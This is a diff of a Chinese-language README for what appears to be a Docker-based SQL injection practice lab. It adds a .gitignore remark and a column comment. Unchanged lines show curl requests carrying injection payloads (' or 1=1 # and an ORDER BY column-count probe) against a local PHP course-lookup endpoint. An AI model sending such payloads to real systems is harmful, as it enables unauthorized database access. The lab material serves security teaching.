@@ -1,7 +1,7 @@
 # 環境建置
 
 1. 安裝 docker 與 docker compose
-2. 複製 env.example 為 .env
+2. 複製 env.example 為 .env (加入 .gitignore 不會上傳 .env)
 3. 執行 docker compose up -d
 
 ## 進入 mysql
@@ -31,6 +31,7 @@ curl http://192.168.64.130:8080/getcos.php?no=C001%27%20or%201=1%20%23 # ' or 1=
 ## 測試欄位長度
 
 ```bash
+# 課程編號, 課程名稱, 學分(int)
 # SELECT * FROM 課程表 where 課程編號 = 'C001' ORDER BY 3 -- '' and 學分 > 2
 # SELECT * FROM 課程表 where 課程編號 = 'C001' ORDER BY 4 -- '' and 學分 > 2
 curl http://192.168.64.130:8080/getcos.php?no=C001%27%20ORDER%20BY%203%20--%20%27 # ' ORDER BY 3 -- '
